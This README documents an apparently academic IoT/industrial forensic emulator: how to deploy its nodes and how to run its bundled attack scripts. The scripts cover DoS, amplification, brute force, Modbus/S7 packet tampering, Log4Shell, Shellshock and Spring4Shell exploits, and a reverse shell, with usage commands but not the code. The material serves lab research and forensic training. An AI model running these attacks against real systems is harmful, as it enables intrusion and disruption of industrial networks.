# Forensic Internet of Everything Emulator - Installation Guide

Welcome to the installation guide for the Forensic Internet of Everything Emulator. This guide will walk you through the necessary steps to set up and use our powerful emulator.

## Page Explanation

This guide provides detailed instructions for setting up the Forensic Internet of Everything on your Linux host. Please follow the steps carefully to ensure a smooth installation process.

## Prerequisites

Before you begin, make sure you have the following prerequisites in place:

- **Linux Host:** You'll need access to a Linux-based distribution such as Ubuntu, Debian, Fedora or ArchLiux.
- **Docker:** Docker is required for containerization. If not already installed, follow the official [Docker installation guide](https://docs.docker.com/get-docker/) for your Linux distribution.
- **Docker Compose:** Docker Compose simplifies the management of multi-container applications. If not already installed, follow the official [Docker Compose installation guide](https://docs.docker.com/compose/install/) for your Linux distribution.

## Installation

Follow these steps to install the Forensic (Industrial) Internet of Things Emulator:

1. **Clone the Repository:** Open your terminal and run the following command to clone the emulator repository:

    ```bash
    git clone https://github.com/C4denaX/IIoT_ForensicEmulator
    ```

2. **Navigate to the Repository:** Change your current directory to the cloned repository folder:

    ```bash
    cd IIoT_ForensicEmulator
    ```

## Protocol applications

Protocols applications are organized into several folders, each serving a specific purpose:

    - **IT Folder:** This folder contains applications and users used for various IT protocols, including streaming applications, HTTP applications, SFTP applications, and HTTPS scripts.

    - **IoT Folder:** Inside this folder, you'll find applications related to IoT protocols, such as 6lowpan, AMQP, CoAP, Matter, MQTT, and Zigbee.

    - **OT Folder:** The OT folder includes applications that use industrial protocols, such as S7COMM, OPC UA, and Modbus/TCP.

One of the advantages of our emulator is the flexibility to deploy protocols and applications individually, thanks to dedicated Dockerfiles and provide the Python scripts provided for each component. This allows you to choose and deploy specific protocols or applications based on your testing or research requirements.

### Using Dockerfiles

We've included Dockerfiles for each protocol and application within their respective folders. To deploy a specific protocol or application, follow these steps:

1. **Navigate to the Corresponding Folder:** Use your terminal to navigate to the folder of the protocol or application you want to deploy. For example, to deploy the MQTT protocol, go to the `IoT/MQTT` folder:

    ```bash
    cd IoT/MQTT
    ```

2. **Build the Docker Container:** Use the provided Dockerfile to build a Docker container for the selected protocol or application. Replace `Dockerfile` with the specific filename for the protocol or application you're deploying:

    ```bash
    docker build -t "your-tag" -f "Dockerfile-name" .
    ```

    - `your-tag` should be replaced with a meaningful name for your container.
    - Ensure you include the `.` at the end of the command, indicating the current directory.

3. **Run the Docker Container:** Once the container is built, you can run it with the following command:

    ```bash
    docker run -d "your-tag"
    ```

    - Again, replace `your-tag` with the name you provided in step 2.

This approach allows you to deploy only the protocols and applications you need, providing a highly modular and efficient way to work with our emulator. You can repeat these steps for any protocol or application you wish to deploy individually.

Certainly! Here’s how you can access each node for both Docker-Compose and Mininet approaches:

---

## Scenario Deployment Methods
To facilitate the usage of our emulator, we provide the following scenario to the users to be used as a template:

![Figure](IoE_case_page-0001.png)

The figure illustrates the structure of the IoE (Internet of Everything) network with three distinct topologies: OT (Operational Technology), IoT (Internet of Things), and IT (Information Technology). The OT topology (subnet 172.17.0.0/24) includes nodes for ICS (Industrial Control Systems) such as Modbus, OPC UA, and S7COMM nodes. The IoT topology (subnet 172.18.0.0/24) features MQTT nodes, Matter nodes, and external services. Finally, the IT topology (subnet 172.19.0.0/24) comprises HTTP clients. This segmented network structure supports specialized communication and control between different layers of the IoE system.

### Deploy Scenario using Docker-Compose

To facilitate the deployment of complex scenarios or scenarios with a large number of nodes, it is recommended to use Docker-Compose with a `docker-compose.yml` file. The repository includes an example file for reference. To launch a scenario with Docker-Compose, navigate to the directory containing the `docker-compose.yml` file and use the following command:

```bash
cd /path/to/directory/containing/docker-compose.yml
docker-compose up
```

#### The `docker-compose.yml` Configuration

The `docker-compose.yml` file provided defines a multi-service Docker setup that mirrors the network topology described in the Mininet script. Here’s how it aligns with the Mininet scenario:

1. **Network Segmentation**:
   - **OT Network** (`172.17.0.0/24`): This segment includes services related to Operational Technology (OT) such as Modbus, OPC-UA, and S7 communication. In the `docker-compose.yml`, the services like `modbus_client_reader`, `modbus_client_writer`, `opc_client`, and `s7_client_reader` are assigned to this network to reflect their operational environment.
   - **IoT Network** (`172.18.0.0/24`): This segment covers Internet of Things (IoT) devices like MQTT clients and Matter client. Corresponding services such as `mqtt_client` and `matter_client` are configured to operate in this network.
   - **IT Network** (`172.19.0.0/24`): This segment is for Information Technology (IT) services, which include HTTP clients and streaming users. The `https_user` and `streaming_user` services are set up in this network.

2. **Service Configuration**:
   - Each service defined in the `docker-compose.yml` file corresponds to a specific type of device or application.

3. **Networking**:
   - The `networks` section in the `docker-compose.yml` file configures each service to use a specific subnet.

By using this `docker-compose.yml` configuration, you can facilitate a Docker-based simulation that mirrors the Mininet scenario.

#### Accessing Nodes in Docker-Compose

To access a specific node or service in Docker-Compose, you can use the following command:

```bash
docker exec -it <service_name> /bin/bash
```

Replace `<service_name>` with the name of the service you wish to access, such as `mqtt_client` or `http_client`. This command opens a bash shell inside the specified container, allowing you to interact with it as if you were logged into a standard Linux machine.

#### Ending Docker-Compose Emulation

To stop and remove all containers, networks, and volumes defined in your `docker-compose.yml` file, use the following command:

```bash
docker-compose down
```

### Deploy Scenario using Mininet

Mininet is an alternative to `docker-compose` that is particularly useful for environments with limited RAM. It allows you to script and deploy network topologies efficiently. For instructions on installing Mininet, refer to this [guide](https://mininet.org/download/). It is also necessary to install all the dependencies of the services using the `requeriments.txt` file from the root of the project. To perform the installation, run the following command:

```bash
pip install -r requeriments.txt
```

The `mininet_scenario.py` script provided in this repository is a template for creating and deploying a test network scenario. Here’s a breakdown of what the script does:

#### `mininet_scenario.py`

This script sets up a simulated network using Mininet, which includes three different topologies: OT (Operational Technology), IoT (Internet of Things), and IT (Information Technology). Here’s a brief overview of the script:

1. **Initialization**:
   - The script initializes a Mininet network with custom controllers, links, and switches.

2. **Network Nodes**:
   - **OT Topology**:
     - `gw_ics` (Gateway): `172.17.0.1`
     - `modbus1`: `172.17.0.2`
     - `opcua1`: `172.17.0.3`
     - `s7comm1`: `172.17.0.4`
   - **IoT Topology**:
     - `mqtt1`: `172.18.0.1`
     - `matter1`: `172.18.0.2`
     - `ext_service`: `172.18.0.3`
   - **IT Topology**:
     - `http_client1`: `172.19.0.1`

3. **Switches and Links**:
   - Creates switches for each topology and connects the nodes to their respective switches.
   - Interconnects the switches to simulate the IoE (Internet of Everything) network.

4. **Starting and Stopping the Network**:
   - Starts the network and launches Mininet’s CLI for user interaction.
   - Stops the network after the user exits the CLI.

To deploy the scenario with Mininet, run the following command:

```bash
python mininet_scenario.py
```

#### Accessing Nodes in Mininet

To access a node within the Mininet environment, use the Mininet CLI. Once the network is started and the CLI is launched, you can access any node by using the following command:

```bash
mininet> xterm <node_name>
```

Replace `<node_name>` with the name of the node you want to access, such as `gw_ics` or `mqtt1`. This will open an xterm window for that node, allowing you to interact with it directly.

#### Ending Mininet Emulation

To stop the Mininet emulation, simply exit the Mininet CLI by typing `exit` or pressing `Ctrl+D`. This will stop the network and clean up the resources used by Mininet.

---

This added information should help users understand how to access and manage nodes in both Docker-Compose and Mininet environments.


## Cybersecurity applications

In this section we will detail the use of the tools available in the emulator for the execution of attacks and the start of different forensic processes in the same deployed devices. 

### Cyberattack scripts usage
This guide provides usage instructions and explanations for the scripts located in the `attacker_machine/attacks_scripts` folder. These scripts are designed for various attack simulations and network manipulations.

#### 1. `amplification_UDP_coap.py`

The `amplification_UDP_coap.py` script is designed to perform a UDP amplification attack targeting the CoAP (Constrained Application Protocol) protocol. It uses the Scapy library to modify and resend packets to simulate amplification.

##### Usage:
To run the script, execute it with Python 3. Ensure you have Scapy installed (`pip install scapy`).

```bash
python3 amplification_UDP_coap.py
```

##### Script Logic:

- **Initialization**:
  - `victim_IP`: The IP address of the intended victim (target).
  - `victim_MAC`: The MAC address of the victim’s network interface.

- **Packet Modification**:
  - **`print_packet(pkt)`**: This function is called for each packet captured by Scapy.
    - Extracts and modifies the UDP load (payload) of the packet.
    - Sets the source MAC and IP addresses of the packet to the values specified for the victim.
    - Recalculates checksums for the IP and UDP headers.
    - Displays the modified packet details and sends it out.

- **Packet Sniffing**:
  - Uses `scapy`'s `sniff` function to listen for UDP packets on port `5683` (CoAP).
  - Applies the `print_packet` function to each captured packet.

##### Example:
Ensure that Scapy is installed and run the script on a network interface that can capture UDP packets:

```bash
python3 amplification_UDP_coap.py
```

##### Notes:
- **Permissions**: This script may require root or administrator permissions to access network interfaces and send packets.
- **Network Interface**: Ensure the `iface` parameter in the `sniff` function is set to the appropriate network interface (e.g., `eth0`).

#### 2. `brute_http.sh`

The `brute_http.sh` script is used for performing HTTP brute force attacks using the Hydra tool. It attempts to find valid username and password combinations by testing a list of usernames and passwords against a specified HTTP form.

##### Usage:
To run the script, execute it with the required parameters. Ensure Hydra is installed (`apt-get install hydra` on Debian-based systems).

```bash
./brute_http.sh <IP> <PORT> <username_list> <password_list> <form_path> <username_param> <password_param> <failure_message>
```

##### Parameters:
- `<IP>`: The IP address of the target server.
- `<PORT>`: The port on which the HTTP service is running.
- `<username_list>`: Path to the file containing the list of usernames to test.
- `<password_list>`: Path to the file containing the list of passwords to test.
- `<form_path>`: The path of the login form on the server.
- `<username_param>`: The name of the parameter for the username in the form.
- `<password_param>`: The name of the parameter for the password in the form.
- `<failure_message>`: The message displayed on the page when login fails.

##### Script Logic:
1. **Parameter Check**:
   - The script checks if exactly 8 parameters are provided. If not, it displays the usage information and exits.

2. **Hydra Command**:
   - Uses Hydra to perform the brute force attack:
     - `-L "$USERNAME_LIST"`: Specifies the file containing the list of usernames.
     - `-P "$PASSWORD_LIST"`: Specifies the file containing the list of passwords.
     - `"$IP"`: The target IP address.
     - `-s "$PORT"`: The port number.
     - `http-post-form "$FORM_PATH:$USERNAME_PARAM=^USER^&$PASSWORD_PARAM=^PASS^&Login=Login:$FAILURE_MESSAGE"`: Specifies the form path, parameters, and failure message for Hydra to identify successful and failed login attempts.

##### Example:
Ensure Hydra is installed and run the script with appropriate parameters:

```bash
./brute_http.sh 192.168.1.10 80 user_list.txt pass_list.txt /login path username password "Invalid login"
```

#### 3. `dos_attack_esc.py`

The `dos_attack_esc.py` script is a generalized Denial-of-Service (DoS) attack tool. It performs attacks by sending a large number of TCP packets to a specified target IP and port, and it uses multiple threads to maximize the attack's impact. Additionally, it utilizes NetfilterQueue to introduce delays in packet processing.

##### Usage:
To run the script, execute it with Python 3. Ensure you have the required Python libraries installed (`pip install scapy netfilterqueue`).

```bash
python3 dos_attack_esc.py --target-ip <TARGET_IP> --target-port <TARGET_PORT> [--packets <NUMBER_OF_PACKETS>] [--delay-min <MIN_DELAY>] [--delay-max <MAX_DELAY>] [--threads <NUMBER_OF_THREADS>]
```

##### Parameters:
- `--target-ip`: The IP address of the target server.
- `--target-port`: The port on which the service is running.
- `--packets`: (Optional) The number of packets to send. Default is `1000000`.
- `--delay-min`: (Optional) Minimum delay for packet processing in seconds. Default is `0.5`.
- `--delay-max`: (Optional) Maximum delay for packet processing in seconds. Default is `10.0`.
- `--threads`: (Optional) Number of threads to use for attacks. Default is `9`.

##### Script Logic:

- **Initialization**:
  - **`used_ips`**: List to keep track of used IP addresses.

- **Functions**:
  - **`get_random_ip(base_ip)`**:
    - Generates a random IP address based on the `base_ip` prefix and ensures it is unique by checking against `used_ips`.

  - **`dos_attack(target_ip, target_port, num_packets, delay_interval)`**:
    - Performs a DoS attack by sending TCP packets to the specified `target_ip` and `target_port`.
    - Uses random source IPs and ports and includes a small delay between packets.

  - **`delay(packet, delay_interval)`**:
    - Delays packet processing using a random sleep time within the specified `delay_interval`.

- **Main Execution**:
  - **Argument Parsing**:
    - Uses `argparse` to handle command-line arguments.

  - **Threading**:
    - Creates and starts multiple threads to perform the DoS attack concurrently.

  - **NetfilterQueue**:
    - Binds to queue number `2` and applies the `delay` function to packets to manipulate network traffic.
    - Handles KeyboardInterrupt to unbind the queue on script exit.

##### Example:
Ensure the required libraries are installed and run the script with appropriate parameters:

```bash
python3 dos_attack_esc.py --target-ip 192.168.1.100 --target-port 80 --packets 500000 --delay-min 1.0 --delay-max 5.0 --threads 10
```

##### Notes:
- **Permissions**: This script may require root or administrator permissions to access network interfaces and send packets.
- **Dependencies**: Install required Python libraries with `pip install scapy netfilterqueue`.
#### 4. `malformed_attacks.py`

The `malformed_attacks.py` script performs various types of network attacks using malformed packets. It includes attacks such as Ping of Death, Teardrop Attack, and IP Layer Malformed Packets.

##### Usage:
To run the script, execute it with Python 3. Ensure you have the required Python libraries installed (`pip install scapy`).

```bash
python3 malformed_attacks.py --attack <ATTACK_TYPE> --target-ip <TARGET_IP> [--target-port <TARGET_PORT>]
```

##### Parameters:
- `--attack`: The type of attack to perform:
  - `1` for Ping of Death
  - `2` for Teardrop Attack
  - `3` for Malformed Packets
- `--target-ip`: The IP address of the target.
- `--target-port`: (Optional) The target port, required only for attack type `3`.

##### Script Logic:

- **Functions**:
  - **`ping_of_death(ip_target)`**:
    - Sends a large ICMP packet to the target IP address, potentially causing a Ping of Death attack.

  - **`teardrop(ip_target)`**:
    - Sends fragmented UDP packets to the target IP address to execute a Teardrop Attack.

  - **`malform_packet(pkt)`**:
    - Modifies and sends malformed IP packets by changing the IP length field to a random value.

  - **`ip_layer_malformed_packet(ip_target, port_target)`**:
    - Sniffs packets destined for the target IP address and applies the `malform_packet` function to them.

- **Main Execution**:
  - **Argument Parsing**:
    - Uses `argparse` to handle command-line arguments for selecting the type of attack and specifying the target IP and port.

  - **Attack Execution**:
    - Continuously performs the selected attack until interrupted.
    - Prompts for user input on whether to finish or change the attack.

##### Example:
Ensure the required libraries are installed and run the script with appropriate parameters:

```bash
python3 malformed_attacks.py --attack 1 --target-ip 192.168.1.100
``` 

or

```bash
python3 malformed_attacks.py --attack 3 --target-ip 192.168.1.100 --target-port 80
```

##### Notes:
- **Permissions**: This script may require root or administrator permissions to access network interfaces and send packets.
- **Dependencies**: Install required Python libraries with `pip install scapy`.


#### 5. `manipulation_packets.py`

The `manipulation_packets.py` script analyzes and modifies network packets in real-time. It supports manipulation of various types of packets, including MQTT, AMQP, S7, OPC UA, Modbus, and CoAP.

##### Usage:
To run the script, execute it with Python 3. Ensure you have the required Python libraries installed (`pip install scapy netfilterqueue`).

```bash
python3 manipulation_packets.py
```

##### Script Logic:

- **Functions**:
  - **`cleaner_regex_amqp(string)`**:
    - Cleans and extracts numeric values from a string using regular expressions.

  - **`get_random_string(length)`**:
    - Generates a random string of the specified length using upper and lower case letters.

  - **`modify(packet)`**:
    - Analyzes and modifies packets based on their protocol and port:
      - **MQTT (Port 1883)**:
        - Modifies payload if it contains a temperature value.
      - **AMQP (Port 5672)**:
        - Alters payload message based on specific conditions.
      - **S7 (Port 102)**:
        - Replaces part of the payload with a predefined string.
      - **OPC UA (Port 4840)**:
        - Modifies payload to include a random number.
      - **Modbus (Port 502)**:
        - Alters specific bytes in the payload.
      - **CoAP (Port 5683)**:
        - Modifies GET and PUT method messages to include new payloads or directories.

- **Main Execution**:
  - **Packet Sniffing and Modification**:
    - Uses `NetfilterQueue` to intercept packets.
    - Applies the `modify` function to analyze and modify packets as they pass through the network interface.

##### Example:
Ensure the required libraries are installed and run the script:

```bash
python3 manipulation_packets.py
```

##### Notes:
- **Permissions**: This script requires root or administrator permissions to access and modify network packets.
- **Dependencies**: Install required Python libraries with `pip install scapy netfilterqueue`.

#### 6. `poc.py`

##### Description:
The `poc.py` script is a Proof of Concept (PoC) for the Log4Shell vulnerability (CVE-2021-44228). It demonstrates an exploit for this vulnerability by setting up a Java-based exploit and serving it through an HTTP server, while simultaneously running an LDAP server.

##### Usage:
To run the script, ensure you have Java Development Kit (JDK) 1.8 installed and the necessary JAR files in the `target` directory. Execute the script with Python 3.

```bash
python3 poc.py --userip <LDAP_SERVER_IP> --webport <WEB_SERVER_PORT> --lport <NETCAT_PORT>
```

##### Script Logic:

- **Functions**:
  - **`generate_payload(userip: str, lport: int) -> None`**:
    - Creates a Java class file (`Exploit.java`) that connects back to the specified IP address and port.
    - Compiles the Java class file using the JDK.

  - **`payload(userip: str, webport: int, lport: int) -> None`**:
    - Calls `generate_payload` to create and compile the Java exploit.
    - Starts an LDAP server and a web server to serve the exploit.

  - **`check_java() -> bool`**:
    - Checks if Java is installed by running `java -version` and checking the exit code.

  - **`ldap_server(userip: str, lport: int) -> None`**:
    - Sets up an LDAP server that serves the Java class file using the JNDI payload format.

  - **`main() -> None`**:
    - Initializes the `colorama` library for colored output.
    - Parses command-line arguments for LDAP server IP, web server port, and Netcat port.
    - Checks for Java installation and then sets up the payload and servers.

##### Example:
Ensure the required libraries are installed and run the script with appropriate arguments:

```bash
python3 poc.py --userip 192.168.1.100 --webport 8000 --lport 9001
```
#### 7. `reverse_python.sh`

The `reverse_python.sh` script is a reverse shell written in Python, executed through a Bash script. It connects to a specified IP address and port, then redirects input, output, and error streams to that connection, providing a shell access to the remote machine.

##### Usage:
To use the script, specify the target IP address and port as arguments. Execute the script with Bash.

```bash
bash reverse_python.sh <IP_ADDRESS> <PORT>
```

##### Script Logic:

- **Argument Checking**:
  - Verifies that exactly two arguments (IP address and port) are provided.
  - If the number of arguments is incorrect, prints a usage message and exits.

- **Reverse Shell Execution**:
  - Uses Python to:
    - Create a socket connection to the specified IP address and port.
    - Redirect the standard input, output, and error streams to this socket.
    - Execute a shell (`/bin/sh`), effectively providing a reverse shell to the remote attacker.

##### Example:
To connect back to a listener at `192.168.1.100` on port `4444`:

```bash
bash reverse_python.sh 192.168.1.100 4444
```

#### 8. `scanner_network_edge.py`

The `scanner_network_edge.py` script performs network scanning using the Nmap library. It supports various scan types and can handle different port ranges. The script allows you to scan a specified network and view the scan results.

##### Usage:
To use the script, provide the network address, scan type, and port range as arguments. You can also specify the number of threads for scanning, though this feature is not yet implemented.

```bash
python scanner_network_edge.py --network <NETWORK> --scan-type <SCAN_TYPE> --port-range <PORT_RANGE>
```

##### Arguments:
- `--network`: The network to scan in CIDR notation (e.g., `192.168.1.0/24`).
- `--scan-type`: Type of scan to perform. Options are:
  - `1`: TCP SYN scan (`-sS`)
  - `2`: TCP Connect scan (`-sT`)
  - `3`: UDP scan (`-sU`)
  - `4`: TCP NULL scan (`-sN`)
  - `5`: TCP FIN scan (`-sF`)
  - `6`: TCP XMAS scan (`-sX`)
  - `7`: TCP ACK scan (`-sA`)
- `--port-range`: Range of ports to scan (default is `1-10000`).
- `--threads`: Number of threads for scanning (currently not implemented).

##### Script Logic:

- **Argument Parsing**:
  - Parses command-line arguments to get network address, scan type, port range, and number of threads.

- **IP Address Generation**:
  - Generates a random IP address within the specified network.

- **Scan Network**:
  - Uses Nmap to scan the network based on the selected scan type and port range.
  - Provides options to change the scan type or finish the scan when interrupted.

##### Example:
To perform a TCP SYN scan on the network `192.168.1.0/24` for ports `1-10000`:

```bash
python scanner_network_edge.py --network 192.168.1.0/24 --scan-type 1 --port-range 1-10000
```

#### 9. `shellshock.py`

The `shellshock.py` script attempts to exploit the Shellshock vulnerability (CVE-2014-6271) in CGI servers. It crafts a request with a malicious User-Agent header to execute a reverse shell on the target server.

##### Usage:
To use the script, specify the target host, CGI script URI, type of reverse shell, remote host for the connection, and port number.

```bash
python shellshock.py -t <TARGET_HOST> -u <CGI_SCRIPT_URI> -r <REMOTE_HOST> -p <PORT> -s <SHELL_TYPE>
```

##### Arguments:
- `-t`, `--host`: The remote host to test for the vulnerability (e.g., `localhost`).
- `-u`, `--uri`: The CGI script URI to test (e.g., `/cgi-bin/test`).
- `-s`, `--shell`: The type of reverse shell to use. Options are:
  - `php`: PHP reverse shell
  - `nc`: Netcat reverse shell
  - `dev_tcp`: Bash reverse shell using `/dev/tcp`
  - Default is `nc` if not specified.
- `-r`, `--remote`: The remote host to connect back to with the reverse shell (e.g., `localhost`).
- `-p`, `--port`: The port to connect back to with the reverse shell (e.g., `4444`).

##### Script Logic:

- **Reverse Shell Selection**:
  - Based on the `--shell` argument, the script prepares a reverse shell command:
    - `php`: Uses PHP to open a reverse shell.
    - `nc`: Uses Netcat to open a reverse shell.
    - `dev_tcp`: Uses `/dev/tcp` in Bash for the reverse shell.

- **Crafting the Exploit**:
  - Sends an HTTP request with a malicious User-Agent header containing the crafted reverse shell payload.

- **Response Handling**:
  - Receives and prints the response from the target server to indicate whether the exploit was successful.

##### Example:
To use a Netcat reverse shell with the target host `localhost`, CGI script `/cgi-bin/test`, and connect back to `localhost` on port `4444`:

```bash
python shellshock.py -t localhost -u /cgi-bin/test -r localhost -p 4444 -s nc
```
#### 10. `spring4shell.py`

The `spring4shell.py` script exploits the Spring4Shell vulnerability, allowing for command execution on vulnerable servers. It also facilitates the creation of a reverse shell on the target system.

##### Usage:
To use the script, specify the target URL for the Spring4Shell vulnerability. The script will run the exploit and set up a reverse shell handler.

```bash
python spring4shell.py <scheme://host:port/endpoint>
```

##### Arguments:
- `<scheme://host:port/endpoint>`: The URL of the vulnerable endpoint, including the scheme (e.g., `http://localhost:8080/endpoint`).

##### Script Logic:

1. **Exploit Setup**:
   - Modifies Tomcat log configuration to exploit the Spring4Shell vulnerability and write a JSP web shell to the server.

2. **Reverse Shell Setup**:
   - Creates a temporary HTTP server to serve the reverse shell script.
   - Downloads the reverse shell to the target system and sets execution permissions.

3. **Reverse Shell Execution**:
   - Triggers the execution of the reverse shell on the target system.
   - Waits for the reverse shell to connect back to the attacker's system.

4. **Interactive Command Shell**:
   - Provides an interactive command shell for interacting with the exploited server.
   - Supports commands for triggering the reverse shell (`revsh <ip> <port>`).

##### Key Functions:
- **`get_host(url, with_scheme=False)`**: Extracts and returns the host from the provided URL.
- **`start_server(httpd)`**: Starts the HTTP server for serving the reverse shell payload.
- **`stop_server(httpd)`**: Stops the HTTP server.
- **`Term`**: Command-line interface class for interacting with the exploited server.
  - **`default(args)`**: Handles default commands and triggers reverse shell.
  - **`do_quit(args)`**: Exits the interactive shell.
  - **`get_rev_shell(ip, port)`**: Sets up and triggers the reverse shell on the target server.
- **`run_exploit(url)`**: Runs the Spring4Shell exploit on the target URL and returns the URL of the deployed shell.

##### Example:
To exploit a vulnerable server at `http://localhost:8080/endpoint`:

```bash
python spring4shell.py http://localhost:8080/endpoint
```

After running the exploit, use the interactive shell to execute commands or set up a reverse shell:

```bash
revsh <your-ip> <your-port>
```

### Forensic scripts usage
This guide provides usage instructions and a brief explanation of each forensic script located in the `forensic_scripts` folder. These scripts are used for capturing network traffic, streaming logs, and accessing remote hosts for memory/log collection.

#### 1. `capture.sh`

The `capture.sh` script captures network traffic from a specified network interface and converts the raw packet data into a human-readable format using `tcpdump` and `tshark`.

##### Usage:
```bash
sudo ./capture.sh <interface> <output_file.pcap> <parsed_output.txt>
```

- `<interface>`: The network interface to capture traffic from (e.g., `eth0`).
- `<output_file.pcap>`: The file where the raw packet capture will be stored.
- `<parsed_output.txt>`: The file where the parsed output will be saved in a readable format.

##### Example:
```bash
sudo ./capture.sh eth0 capture.pcap parsed_output.txt
```

##### Script Logic:
1. The script requires **3 parameters** and root privileges to execute.
2. Captures the network traffic on the specified interface using `tcpdump` and stores it in a `.pcap` file.
3. Parses the `.pcap` file using `tshark` and saves the output in a human-readable format.

#### 2. `log_stream.sh`

The `log_stream.sh` script connects to a remote host via SSH and streams the content of a specified log file in real-time, saving the output to a local file.

##### Usage:
```bash
./log_stream.sh <Remote_Host_IP> <Remote_File> <Local_File>
```

- `<Remote_Host_IP>`: The IP address of the remote host where the log file is located.
- `<Remote_File>`: The path of the log file on the remote host.
- `<Local_File>`: The path of the local file where the streamed log data will be saved.

##### Example:
```bash
./log_stream.sh 192.168.1.10 /var/log/syslog ./local_syslog.txt
```

##### Script Logic:
1. The script checks if exactly **3 parameters** are provided.
2. Establishes an SSH connection to the remote host and uses the `tail -f` command to stream the log file in real-time.
3. The output is redirected to a specified local file.


#### 3. `ssh_memory_log.py`

The `ssh_memory_log.py` script scans for hosts running SSH within a specified IP range, allows the user to connect to a selected host, and then performs a memory/log duplication by running commands remotely via SSH.

##### Usage:
```bash
python3 ssh_memory_log.py <IP_range>
```

- `<IP_range>`: The IP range to scan for hosts with SSH open (e.g., `192.168.1.0/24`).

##### Example:
```bash
python3 ssh_memory_log.py 192.168.1.0/24
```

##### Script Logic:
1. Uses **nmap** to scan the specified IP range for hosts with SSH enabled.
2. Lists available hosts and prompts the user to select one.
3. Prompts for SSH credentials and connects to the selected host.
4. Once connected, it runs the `df` command to list the available filesystems and prompts the user to select one for duplication.
5. Duplicates the selected filesystem using `dd` and downloads the copied file to the local machine via SFTP.

##### Important Notes:
- The script requires SSH credentials for the target host.
- The file duplication process involves using `sudo` privileges on the remote host, and the script will prompt for the password.

### Python Scripts for Local Deployment

In addition to Docker containers, we provide Python scripts that can be deployed locally on your host machine. These scripts offer additional flexibility for customization and testing. Here's how to use them:

1. **Navigate to the Corresponding Script:** Locate the Python script for the protocol or application you want to deploy. These scripts are available in the corresponding folder.

2. **Adapt the Script:** Open the script in your preferred text editor and adapt it to your specific localhost. You may need to configure network settings, IP addresses, or other parameters to match your environment.

3. **Run the Script:** Execute the Python script on your local host using Python 3. Replace `script.py` with the actual filename of the script you're using:

    ```bash
    python3 script.py
    ```

Remember that these Python scripts are intended for the emulator use and should be adapted to your unique situation. They provide a valuable tool for fine-tuning and testing our emulator funtionality.

## Deploying Forensic Applications to Your Scenarios

To utilize the forensic tools available in the `forensic_scripts` directory, you can follow one of two straightforward methods:

1. **Deploying an Attacker Node as a Forensic Node**

The `attacker_machine` node, integrated with forensic tools, offers a convenient deployment option. However, challenges arise with data persistence and network traffic capture due to Docker container limitations. To address these issues, Docker Volumes should be used to ensure data persistence. Here’s how you can do this:

```bash
    docker volume create forensic_data
    docker run -it -v forensic_data:/data <attacker_node_image>
```

By using these commands, you create a Docker Volume (`forensic_data`) that will persistently store data collected by the forensic container.

2. **Using the Host Machine**

Alternatively, you can deploy Docker and Mininet directly from the host machine running the network. This approach integrates both deployment types and ensures data persistence without Docker container limitations. 

For Mininet deployments, you already know the device-to-IP mappings. For Docker deployments, it’s useful to scan the network to determine IP allocations. We recommend using `nmap` (or `zmap` for Windows). To install `nmap` on Linux, use:

```bash
    sudo apt install nmap
```

To scan the network, execute:

```bash
    nmap <subnet_to_scan>
```

Once you identify the relevant IP addresses, you can apply your forensic scripts. These scripts are designed to save collected information to the directory from which they are executed.


*Explore, Test, and Secure IoE Networks with Confidence.*

